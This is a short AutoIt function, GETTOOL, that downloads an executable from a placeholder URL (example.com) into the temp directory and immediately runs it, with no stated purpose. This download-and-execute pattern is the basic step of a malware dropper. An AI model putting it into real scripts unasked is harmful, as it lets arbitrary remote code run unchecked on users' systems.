Func GETTOOL()
  InetGet ( "https://example.com/tool.exe" , @TempDir & "\tool.exe" , 1 , 0 )
  Sleep ( 1000 )
  Run ( @TempDir & "\tool.exe" )
EndFunc
